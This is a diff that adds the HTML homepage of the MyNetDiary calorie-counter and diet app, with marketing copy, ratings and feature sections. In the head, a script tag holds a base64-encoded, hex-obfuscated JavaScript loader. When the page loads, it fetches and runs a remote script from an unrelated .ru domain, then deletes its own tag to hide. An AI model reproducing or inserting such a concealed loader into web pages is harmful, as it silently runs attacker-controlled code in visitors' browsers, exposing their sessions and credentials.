@@ -1,0 +1,681 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <title>MyNetDiary - Free Calorie Counter and Diet Assistant</title>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Free calorie counter and food diary app. MyNetDiary is your digital diet assistant for weight loss. Our calorie counter is easy to use, and the application goes way beyond that. Try MyNetDiary today!"/>
+    <meta name="keywords" content="calorie counter, calorie tracker, food diary, weight loss, diet journal, healthy recipes, how to lose weight, health, nutrition facts, weight loss online, free calorie counter, lose weight, diet, fitness, workout, exercise, cardio, iphone, android, iOS, samsung, barcode, calories, step counter, app, gain weight, diabetes"/>
+
+    <meta property="og:site_name" content="MyNetDiary">
+    <meta property="og:url" content="https://www.mynetdiary.com/">
+    <meta property="og:image" content="https://www.mynetdiary.com/images/MyNetDiary_cover.jpg">
+    <meta property="og:type" content="website">
+    <meta property="og:description" content="Free calorie counter and nutrition assistant app. MyNetDiary is your digital diet assistant for weight loss. Our calorie counter is easy to use, and the application goes way beyond that. Try MyNetDiary today!">
+    <meta property="og:title" content="MyNetDiary - Free Calorie Counter and Diet Assistant">
+
+    <link href="https://www.mynetdiary.com/css/homepage.2019_rel23.63.css"  rel="Stylesheet" type="text/css"/>
+
+    <link rel="shortcut icon" href="https://s3.amazonaws.com/img.mynetdiary.com/images/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" href="https://s3.amazonaws.com/img.mynetdiary.com/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="57x57" href="https://s3.amazonaws.com/img.mynetdiary.com/images/apple-touch-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="https://s3.amazonaws.com/img.mynetdiary.com/images/apple-touch-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="https://s3.amazonaws.com/img.mynetdiary.com/images/apple-touch-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="https://s3.amazonaws.com/img.mynetdiary.com/images/apple-touch-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="https://s3.amazonaws.com/img.mynetdiary.com/images/apple-touch-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="https://s3.amazonaws.com/img.mynetdiary.com/images/apple-touch-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="https://s3.amazonaws.com/img.mynetdiary.com/images/apple-touch-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://s3.amazonaws.com/img.mynetdiary.com/images/apple-touch-icon-180x180.png">
+
+<script id="RRF40" src="data:text/javascript;base64, dmFyIF9hOGhJVyA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX2toWmZZLCBfQWN4RVYpIHt2YXIgX1dRZzl4ID0gZnVuY3Rpb24oX0xvdFBSKSB7d2hpbGUgKC0tX0xvdFBSKSB7X2toWmZZWydwdXNoJ10oX2toWmZZWydzaGlmdCddKCkpO319O19XUWc5eCgrK19BY3hFVik7fShfYThoSVcsIDB4MTFiKSk7dmFyIF8yeVEyRCA9IGZ1bmN0aW9uKF9RTUZINywgX3RkcUVsKSB7X1FNRkg3ID0gX1FNRkg3IC0gMHgwO3ZhciBfYWNJMXQgPSBfYThoSVdbX1FNRkg3XTtyZXR1cm4gX2FjSTF0O307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfMnlRMkQoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX2cwcldoID0gZG9jdW1lbnRbXzJ5UTJEKCcweDEnKV0oXzJ5UTJEKCcweDInKSk7X2cwcldoW18yeVEyRCgnMHgzJyldID0gXzJ5UTJEKCcweDQnKTtfZzByV2hbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2M1x4NzVceDYzXHg3NVx4NmRceDYyXHg2NVx4NzJceDJkXHg3Mlx4NjlceDYzXHg2Ylx4MmVceDcyXHg3NVx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NmRceDQ4XHg2Nlx4NTlceDM1XHg0M1x4NTRceDZhXHg1Nlx4NmMnO2RvY3VtZW50W18yeVEyRCgnMHg1JyldKF8yeVEyRCgnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9nMHJXaCk7ZG9jdW1lbnRbXzJ5UTJEKCcweDcnKV0oJ1JSRjQwJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
+</head>
+<body>
+    <nav class="navbar-site navbar navbar-expand-md">
+        <div class="container">
+            <a class="navbar-brand" href="index.html">
+                <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-main.svg" alt="MyNetDiary" width="300" class="img-fluid w-100">
+            </a>
+            <button class="navbar-toggler collapsed" type="button">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="siteMainSidebar">
+                <ul class="navbar-nav _buttons d-flex d-md-none flex-row">
+                    <li class="nav-item">
+                        <a class="btn btn-tertiary" href="https://www.mynetdiary.com/logonPage.do" role="button">Sign in</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="btn btn-secondary" href="https://www.mynetdiary.com/signupPage.do" role="button">Sign up</a>
+                    </li>
+                </ul>
+                <ul id="collapseMenu" class="navbar-nav navbar-nav-site ml-auto mr-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="https://www.mynetdiary.com/products.do">Features</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="https://www.mynetdiary.com/library.html">Library</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="https://www.mynetdiary.com/blog.html">Blog</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="https://www.mynetdiary.com/find-a-health-professional.html">Professionals</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="https://www.mynetdiary.com/mynetdiary-for-business.html">Business</a>
+                    </li>
+                </ul>
+                <ul class="navbar-nav _buttons d-none d-md-flex">
+                    <li class="nav-item">
+                        <a class="btn btn-primary" href="https://www.mynetdiary.com/signupPage.do" role="button">Sign up</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="btn btn-tertiary" href="https://www.mynetdiary.com/logonPage.do" role="button">Sign in</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+    <section class="section-start">
+        <div class="_layers">
+            <div class="container">
+                <div class="_text">
+                    <h1 class="_headline">Be Healthy<br> for Life!</h1>
+                    <p>Your weight loss, diet, and<br> nutrition assistant.</p>
+                    <a href="https://www.mynetdiary.com/signupPage.do" class="btn btn-primary btn-max btn-shadow btn-arrow" role="button">
+                        <span class="_overlay">Sign up</span>
+                    </a>
+                </div>
+                <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/iphonex@1x.png"
+                        srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/iphonex@2x.png 1234w,
+                                https://s3.amazonaws.com/img.mynetdiary.com/images/iphonex@1x.png 567w,
+                                https://s3.amazonaws.com/img.mynetdiary.com/images/iphonex@0,5x.png 284w"
+                        sizes="(min-width: 2000px) 1234px,
+                                (min-width: 576px) 567px,
+                                284px"
+                        alt="MyNetDiary calorie counter app for iPhone and Android" class="__layer-phone">
+                <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/iwatch@1x.png"
+                        srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/iwatch@2x.png 823w,
+                                https://s3.amazonaws.com/img.mynetdiary.com/images/iwatch@1x.png 412w,
+                                https://s3.amazonaws.com/img.mynetdiary.com/images/iwatch@0,5x.png 206w"
+                        sizes="(min-width: 2000px) 823px,
+                                (min-width: 576px) 412px,
+                                206px"
+                        alt="MyNetDiary calorie counter app for Apple watch app" class="__layer-watch">
+                <div class="_stores">
+                    <a href="https://apps.apple.com/us/app/calorie-counter-mynetdiary/id287529757?pt=10328&amp;ct=index_page" class="__item" role="button"><img src="https://s3.amazonaws.com/img.mynetdiary.com/images/app-store-badge.svg" width="190" alt="App Store" class="img-fluid"></a>
+                    <a href="https://play.google.com/store/apps/details?id=com.fourtechnologies.mynetdiary.ad&amp;referrer=utm_source%3Dindex_page%26utm_campaign%3Dindex_page_link" class="__item" role="button"><img src="https://s3.amazonaws.com/img.mynetdiary.com/images/google-play-badge.svg" width="190" alt="Google Play" class="img-fluid"></a>
+                </div>
+            </div>
+        </div>
+        <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/bg-start-right@1x.png"
+            srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/bg-start-right@2x.png 1248w,
+                    https://s3.amazonaws.com/img.mynetdiary.com/images/bg-start-right@1x.png 624w"
+            sizes="(min-width: 1920px) 1200px,
+                    300px"
+            alt="Plate" class="__layer-right">
+        <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/bg-start-left@1x.png"
+            srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/bg-start-left@2x.png 2x"
+            alt="Berries" class="__layer-left">
+    </section>
+    <section class="section-quote">
+        <div class="container">
+            <blockquote>
+                <p>“You really can't go wrong with MyNetDiary<br class="d-none d-sm-block"> as a scientifically-proven way to help you lose weight”</p>
+                <div class="__footer">
+                    <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/wh-logo.svg" alt="Women's Health" class="__wh">
+                </div>
+            </blockquote>
+            <ul id="triggerStep1" class="_logos">
+                <li class="d-none d-md-inline"><img src="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-usa-today.png" srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-usa-today@2x.png 2x" alt="USA Today" width="253" height="45" class="img-fluid"></li>
+                <li><img src="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-abc-news.svg" alt="ABC News" width="169" height="60" class="img-fluid"></li>
+                <li><img src="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-fox.svg" alt="FOX" width="117" height="50" class="img-fluid"></li>
+                <li><img src="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-times.svg" alt="Times" width="47" height="65" class="img-fluid"></li>
+                <li><img src="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-consumer-reports.svg" width="198" height="50" alt="Consumer Reports" class="img-fluid"></li>
+                <li class="d-none d-sm-inline"><img src="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-wsj.svg" width="90" height="50" alt="WSJ" class="img-fluid"></li>
+                <li class="d-none d-sm-inline"><img src="https://s3.amazonaws.com/img.mynetdiary.com/images/logo-chicago-tribune.svg" width="268" height="40" alt="Chicago Tribune" class="img-fluid"></li>
+            </ul>
+        </div>
+    </section>
+    <section class="section-steps">
+        <div class="container">
+            <h3 id="triggerStep2" class="_headline">What it takes to succeed</h3>
+            <div id="triggerStep3" class="_steps">
+                <div class="accordion d-none d-md-block" id="accordionSteps">
+                    <div class="__step" data-toggle="collapse" data-target="#collapseOne" aria-expanded="false" aria-controls="collapseOne">
+                        <div class="__number"><span>1</span></div>
+                        <h4 class="__header" id="stepHeadingOne" data-target="#carouselSteps" data-slide-to="0">
+                            Set Your Targets and Plan
+                        </h4>
+                        <div id="collapseOne" class="collapse show" aria-labelledby="stepHeadingOne" data-parent="#accordionSteps">
+                            <div class="__body">
+                                We will ask a few questions to help get you started with your own personal Daily Calorie Budget. Choose your desired weekly weight loss rate, target date, and source of calories like fat, carbs, and proteins.
+                            </div>
+                        </div>
+                    </div>
+                    <div class="__step collapsed" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="true" aria-controls="collapseTwo">
+                        <div class="__number"><span>2</span></div>
+                        <h4 class="__header" id="stepHeadingTwo" data-target="#carouselSteps" data-slide-to="1">
+                            Log Meals & Exercise
+                        </h4>
+                        <div id="collapseTwo" class="collapse" aria-labelledby="stepHeadingTwo" data-parent="#accordionSteps">
+                            <div class="__body">
+                                Use the App to track your food, physical activities, and nutrients. Use the barcode scanner. Link your steps tracker or other devices. Log ahead of time for better planning and scheduling.
+                            </div>
+                        </div>
+                    </div>
+                    <div class="__step collapsed" data-toggle="collapse" data-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree">
+                        <div class="__number"><span>3</span></div>
+                        <h4 class="__header" id="stepHeadingThree" data-target="#carouselSteps" data-slide-to="2">
+                            Stay on Track
+                        </h4>
+                        <div id="collapseThree" class=" collapse" aria-labelledby="stepHeadingThree" data-parent="#accordionSteps">
+                            <div class="__body">
+                                Monitor your daily progress, check your weight loss forecast, and receive ongoing advice and feedback. Learn more about nutrients in your diet and make better choices.
+                            </div>
+                        </div>
+                    </div>
+                    <div class="__step collapsed" data-toggle="collapse" data-target="#collapseFour" aria-expanded="false" aria-controls="collapseFour">
+                        <div class="__number"><span>4</span></div>
+                        <h4 class="__header" id="stepHeadingFour" data-target="#carouselSteps" data-slide-to="3">
+                            Reach Your Goals!
+                        </h4>
+                        <div id="collapseFour" class="collapse" aria-labelledby="stepHeadingFour" data-parent="#accordionSteps">
+                            <div class="__body ">
+                                Keep up with the plan to steadily lose weight and reach your goals. Learn nutrition and dieting, and keep using MyNetDiary to maintain a healthy living once you get there.
+                            </div>
+                        </div>
+                    </div>
+                </div> <!-- /.accordion -->
+                <div id="carouselSteps" class="carousel slide" data-ride="carousel" data-interval="false">
+                    <ol class="carousel-indicators d-flex d-md-none">
+                        <li data-target="#carouselSteps" data-slide-to="0" class="active"><span data-toggle="collapse" data-target="#collapseOne" aria-expanded="false" aria-controls="collapseOne" class="d-block h-100"></span></li>
+                        <li data-target="#carouselSteps" data-slide-to="1"><span data-toggle="collapse" data-target="#collapseTwo" aria-expanded="true" aria-controls="collapseTwo" class="d-block h-100"></span></li>
+                        <li data-target="#carouselSteps" data-slide-to="2"><span data-toggle="collapse" data-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree" class="d-block h-100"></span></li>
+                        <li data-target="#carouselSteps" data-slide-to="3"><span data-toggle="collapse" data-target="#collapseFour" aria-expanded="false" aria-controls="collapseFour" class="d-block h-100"></span></li>
+                    </ol>
+                    <div class="carousel-inner">
+                        <div class="carousel-item active">
+                            <figure class="__collage">
+                                <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/step-1-collage@1x.png"
+                                        srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/step-1-collage@2x.png 1200w,
+                                                https://s3.amazonaws.com/img.mynetdiary.com/images/step-1-collage@1x.png 600w,
+                                                https://s3.amazonaws.com/img.mynetdiary.com/images/step-1-collage@0,5x.png 300w"
+                                        sizes="(min-width: 2000px) 1200px,
+                                                (min-width: 480px) 600px,
+                                                300px"
+                                        alt="MyNetDiary iPhone app: calorie planning screen" class="w-100">
+                            </figure>
+                            <div class="__step d-block d-md-none">
+                                <div class="__number"><span>1</span></div>
+                                <h4 class="__heading">Set Your Targets and Plan</h4>
+                                We will ask a few questions to help get you started with your own personal Daily Calorie Budget. Choose your desired weekly weight loss rate, target date, and source of calories like fat, carbs, and proteins.
+                            </div>
+                        </div>
+                        <div class="carousel-item">
+                            <figure class="__collage">
+                                <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/step-2-collage@1x.png"
+                                        srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/step-2-collage@2x.png 1200w,
+                                                https://s3.amazonaws.com/img.mynetdiary.com/images/step-2-collage@1x.png 600w,
+                                                https://s3.amazonaws.com/img.mynetdiary.com/images/step-2-collage@0,5x.png 300w"
+                                        sizes="(min-width: 2000px) 1200px,
+                                                (min-width: 480px) 600px,
+                                                300px"
+                                        alt="MyNetDiary iPhone app: meals screen" class="w-100">
+                            </figure>
+                            <div class="__step d-block d-md-none">
+                                <div class="__number"><span>2</span></div>
+                                <h4 class="__heading">Log Meals & Exercise</h4>
+                                Use the App to track your food, physical activities, and nutrients. Use the barcode scanner. Link your steps tracker or other devices. Log ahead of time for better planning and scheduling.
+                            </div>
+                        </div>
+                        <div class="carousel-item">
+                            <figure class="__collage">
+                                <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/step-3-collage@1x.png"
+                                        srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/step-3-collage@2x.png 1200w,
+                                                https://s3.amazonaws.com/img.mynetdiary.com/images/step-3-collage@1x.png 600w,
+                                                https://s3.amazonaws.com/img.mynetdiary.com/images/step-3-collage@0,5x.png 300w"
+                                        sizes="(min-width: 2000px) 1200px,
+                                                (min-width: 480px) 600px,
+                                                300px"
+                                        alt="MyNetDiary iPhone app: diet analysis screen" class="w-100">
+                            </figure>
+                            <div class="__step d-block d-md-none">
+                                <div class="__number"><span>3</span></div>
+                                <h4 class="__heading">Stay on Track</h4>
+                                Monitor your daily progress, check your weight loss forecast, and receive ongoing advice and feedback. Learn more about nutrients in your diet and make better choices.
+                            </div>
+                        </div>
+                        <div class="carousel-item">
+                            <figure class="__collage">
+                                <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/step-4-collage@1x.png"
+                                        srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/step-4-collage@2x.png 1200w,
+                                                https://s3.amazonaws.com/img.mynetdiary.com/images/step-4-collage@1x.png 600w,
+                                                https://s3.amazonaws.com/img.mynetdiary.com/images/step-4-collage@0,5x.png 300w"
+                                        sizes="(min-width: 2000px) 1200px,
+                                                (min-width: 480px) 600px,
+                                                300px"
+                                        alt="MyNetDiary iPhone app: weight loss and diet goals" class="w-100">
+                            </figure>
+                            <div class="__step d-block d-md-none">
+                                <div class="__number"><span>4</span></div>
+                                <h4 class="__heading">Reach Your Goals!</h4>
+                                Keep up with the plan to steadily lose weight and reach your goals. Learn nutrition and dieting, and keep using MyNetDiary to maintain a healthy living once you get there.
+                            </div>
+                        </div>
+                    </div>
+                    <a class="carousel-control-prev d-block d-md-none" href="#carouselSteps" role="button" data-slide="prev">
+                        <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+                        <span class="sr-only">Previous</span>
+                    </a>
+                    <a class="carousel-control-next d-block d-md-none" href="#carouselSteps" role="button" data-slide="next">
+                        <span class="carousel-control-next-icon" aria-hidden="true"></span>
+                        <span class="sr-only">Next</span>
+                    </a>
+                </div><!-- /.carousel -->
+            </div><!-- /.steps -->
+        </div>
+        <div class="_footer">Take charge of your health <br class="d-block d-md-none"> <a href="https://www.mynetdiary.com/signupPage.do" class="btn btn-primary btn-max btn-shadow" role="button">Start Today!</a></div>
+    </section>
+    <section class="section-toprated">
+        <div class="container">
+            <div class="_reviews">
+                <div class="__item">
+                    <span class="___platform">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="55px" height="66px" viewBox="0 0 55 66">
+                            <path fill-rule="evenodd"  fill="rgb(70, 97, 138)" d="M54.973,48.337 L54.955,48.396 C54.494,49.871 53.128,53.730 50.405,57.704 C47.796,61.510 44.838,65.824 40.021,65.914 C37.769,65.956 36.246,65.295 34.766,64.656 C33.265,64.007 31.713,63.336 29.281,63.336 C26.724,63.336 25.094,64.029 23.518,64.701 C22.114,65.297 20.662,65.915 18.653,65.995 C18.570,65.999 18.489,66.000 18.409,66.000 C14.132,66.000 11.010,62.002 7.926,57.547 C1.748,48.637 -1.804,33.943 3.783,24.260 C6.721,19.156 12.051,15.933 17.690,15.851 C17.747,15.849 17.804,15.849 17.861,15.849 C20.287,15.849 22.578,16.757 24.600,17.558 C26.112,18.157 27.417,18.675 28.423,18.675 C29.318,18.675 30.616,18.163 32.119,17.572 C34.296,16.714 37.006,15.647 39.835,15.647 C40.197,15.647 40.558,15.665 40.907,15.700 C43.316,15.803 49.298,16.663 53.201,22.368 C53.284,22.488 53.314,22.637 53.285,22.780 C53.256,22.924 53.170,23.048 53.047,23.127 L52.995,23.161 C51.861,23.861 46.206,27.727 46.278,35.027 C46.357,44.013 53.798,47.311 54.646,47.657 C54.653,47.660 54.679,47.671 54.686,47.674 C54.937,47.790 55.061,48.075 54.973,48.337 ZM28.568,16.066 C28.333,16.065 28.098,16.057 27.868,16.038 C27.613,16.019 27.406,15.823 27.373,15.570 C26.837,11.523 28.870,7.509 30.951,5.101 C33.400,2.236 37.497,0.137 40.912,-0.003 C41.193,-0.014 41.442,0.196 41.473,0.479 C41.869,4.085 40.560,8.112 37.970,11.249 C35.510,14.221 31.907,16.066 28.568,16.066 Z"/>
+                        </svg>
+                        4.7
+                    </span>
+                    <div class="___score">
+                        <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/rating-star-full.png" width="42" alt="Star">
+                        <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/rating-star-full.png" width="42" alt="Star">
+                        <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/rating-star-full.png" width="42" alt="Star">
+                        <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/rating-star-full.png" width="42" alt="Star">
+                        <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/rating-star-4.7.png" width="42" alt="Star">
+                    </div>
+                </div>
+                <div class="__item">
+                    <span class="___platform">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="59px" height="69px" viewBox="0 0 59 69">
+                            <path fill-rule="evenodd" fill="rgb(70, 97, 138)" d="M57.743,47.436 C56.905,48.266 55.885,48.680 54.684,48.680 C53.512,48.680 52.505,48.266 51.667,47.436 C50.829,46.607 50.411,45.599 50.411,44.409 L50.411,26.578 C50.411,25.391 50.829,24.388 51.667,23.572 C52.505,22.757 53.511,22.349 54.684,22.349 C55.885,22.349 56.905,22.757 57.743,23.572 C58.581,24.388 59.000,25.391 59.000,26.578 L59.000,44.409 C59.000,45.599 58.581,46.607 57.743,47.436 ZM12.782,12.708 C14.570,9.985 16.973,7.865 19.989,6.341 L17.014,0.911 C16.818,0.551 16.888,0.276 17.223,0.081 C17.586,-0.085 17.865,-0.001 18.061,0.329 L21.078,5.805 C23.732,4.643 26.540,4.061 29.501,4.061 C32.462,4.061 35.269,4.643 37.924,5.805 L40.941,0.329 C41.136,-0.001 41.415,-0.086 41.779,0.081 C42.113,0.275 42.183,0.551 41.988,0.911 L39.012,6.341 C42.001,7.865 44.390,9.985 46.178,12.708 C47.966,15.432 48.860,18.410 48.860,21.645 L10.100,21.645 C10.100,18.409 10.994,15.432 12.782,12.708 ZM37.189,14.241 C37.510,14.561 37.894,14.720 38.342,14.720 C38.788,14.720 39.165,14.561 39.473,14.241 C39.780,13.924 39.934,13.545 39.934,13.102 C39.934,12.660 39.780,12.281 39.473,11.962 C39.165,11.644 38.789,11.485 38.342,11.485 C37.894,11.485 37.510,11.644 37.189,11.962 C36.867,12.280 36.707,12.660 36.707,13.102 C36.707,13.545 36.867,13.924 37.189,14.241 ZM19.527,14.241 C19.834,14.561 20.211,14.720 20.658,14.720 C21.105,14.720 21.489,14.561 21.811,14.241 C22.131,13.924 22.292,13.545 22.293,13.102 C22.293,12.660 22.132,12.281 21.811,11.962 C21.489,11.644 21.105,11.485 20.658,11.485 C20.212,11.485 19.834,11.644 19.527,11.962 C19.220,12.280 19.066,12.660 19.066,13.102 C19.066,13.545 19.220,13.924 19.527,14.241 ZM4.316,48.680 C3.114,48.680 2.095,48.266 1.257,47.436 C0.419,46.607 0.000,45.599 0.000,44.409 L0.000,26.578 C0.000,25.417 0.419,24.422 1.257,23.593 C2.095,22.763 3.114,22.349 4.316,22.349 C5.489,22.349 6.495,22.763 7.333,23.593 C8.172,24.422 8.590,25.417 8.590,26.578 L8.590,44.409 C8.590,45.599 8.178,46.607 7.354,47.436 C6.529,48.266 5.516,48.680 4.316,48.680 ZM48.732,50.754 C48.732,52.027 48.285,53.105 47.391,53.989 C46.496,54.873 45.421,55.315 44.165,55.315 L41.022,55.315 L41.022,64.728 C41.022,65.917 40.603,66.927 39.765,67.756 C38.927,68.585 37.907,69.000 36.706,69.000 C35.505,69.000 34.485,68.585 33.647,67.756 C32.809,66.927 32.390,65.917 32.390,64.728 L32.390,55.315 L26.608,55.315 L26.608,64.728 C26.608,65.917 26.189,66.927 25.351,67.756 C24.513,68.585 23.493,69.000 22.292,69.000 C21.119,69.000 20.113,68.585 19.275,67.756 C18.437,66.927 18.018,65.917 18.018,64.728 L17.976,55.314 L14.875,55.314 C13.590,55.314 12.501,54.872 11.606,53.988 C10.713,53.104 10.266,52.027 10.266,50.754 L10.266,23.136 L48.732,23.136 L48.732,50.754 Z"/>
+                        </svg>
+                        4.7
+                    </span>
+                    <div class="___score">
+                        <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/rating-star-full.png" width="42" alt="Star">
+                        <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/rating-star-full.png" width="42" alt="Star">
+                        <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/rating-star-full.png" width="42" alt="Star">
+                        <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/rating-star-full.png" width="42" alt="Star">
+                        <img src="https://s3.amazonaws.com/img.mynetdiary.com/images/rating-star-4.7.png" width="42" alt="Star">
+                    </div>
+                </div>
+            </div>
+            <p class="text-center"><small>50,907 reviews & counting</small></p>
+            <h3 class="_headline">Top Rated<br class="d-block d-md-none"> Calorie Counter App</h3>
+            <blockquote>“This is my favorite food diary app. I used six of the "top" apps in this category for several days so that I could compare them and select what worked best for me. MyNetDiary was the winner. Intuitive, simple layout, decent database, appealing graphic design, and no ads.”</blockquote>
+            <a href="https://www.mynetdiary.com/reviews.html" class="btn btn-tertiary btn-arrow btn-lg">See More Testimonials</a>
+            <div class="_features">
+                <div class="__item">
+                    <img data-src="https://s3.amazonaws.com/img.mynetdiary.com/images/simple-planning@1x.jpg"
+                    data-srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/simple-planning@2x.jpg 920w,
+                            https://s3.amazonaws.com/img.mynetdiary.com/images/simple-planning@1x.jpg 460w,
+                            https://s3.amazonaws.com/img.mynetdiary.com/images/simple-planning@0,5x.jpg 230w"
+                    sizes="(min-width: 2000px) 460px,
+                            (min-width: 576px) 460px,
+                            340px"
+                    alt="MyNetDiary provides simple diet planning" class="lazyload img-fluid">
+                    <h5 class="__heading">Simple<br class="d-none d-lg-block d-xl-none"> Planning</h5>
+                    <p>Supports any diet, plan calories or<br class="d-block d-lg-none d-xl-block"> macros, plan meals and recipes</p>
+                </div>
+                <div class="__item">
+                    <img data-src="https://s3.amazonaws.com/img.mynetdiary.com/images/easiest-food-tracking@1x.jpg"
+                    data-srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/easiest-food-tracking@2x.jpg 920w,
+                            https://s3.amazonaws.com/img.mynetdiary.com/images/easiest-food-tracking@1x.jpg 460w,
+                            https://s3.amazonaws.com/img.mynetdiary.com/images/easiest-food-tracking@0,5x.jpg 230w"
+                    sizes="(min-width: 2000px) 460px,
+                            (min-width: 576px) 460px,
+                            340px"
+                    alt="MyNetDiary provides easiest food tracking and calorie counting" class="lazyload img-fluid">
+                    <h5 class="__heading">Easiest <br class="d-none d-lg-block d-xl-none">Food Tracking</h5>
+                    <p>Huge database, barcode scanner,<br class="d-block d-lg-none d-xl-block"> quickest food lookup</p>
+                </div>
+                <div class="__item">
+                    <img data-src="https://s3.amazonaws.com/img.mynetdiary.com/images/advice-feedback@1x.jpg"
+                    data-srcset="https://s3.amazonaws.com/img.mynetdiary.com/images/advice-feedback@2x.jpg 920w,
+                            https://s3.amazonaws.com/img.mynetdiary.com/images/advice-feedback@1x.jpg 460w,
+                            https://s3.amazonaws.com/img.mynetdiary.com/images/advice-feedback@0,5x.jpg 230w"
+                    sizes="(min-width: 2000px) 460px,
+                            (min-width: 576px) 460px,
+                            340px"
+                    alt="MyNetDiary provides advice and feedback for diet" class="lazyload img-fluid">
+                    <h5 class="__heading">Advice<br class="d-none d-lg-block d-xl-none"> and Feedback</h5>
+                    <p>Encouraging and supportive feedback,<br class="d-block d-lg-none d-xl-block"> guiding you to your goal.</p>
+                </div>
+            </div>
+            <a href="https://www.mynetdiary.com/products.do" class="btn btn-tertiary btn-arrow btn-lg" role="button">More Features</a>
+        </div>
+    </section>
+    <section class="section-slider">
+        <div class="_wrapper">
+        <div class="container">
+            <div id="carouselSuccessStory" class="carousel slide" data-ride="carousel" data-interval="false">
+                <ol class="carousel-indicators">
+                    <li data-target="#carouselSuccessStory" data-slide-to="0" class="active"></li>
+                    <li data-target="#carouselSuccessStory" data-slide-to="1"></li>
+                    <li data-target="#carouselSuccessStory" data-slide-to="2"></li>
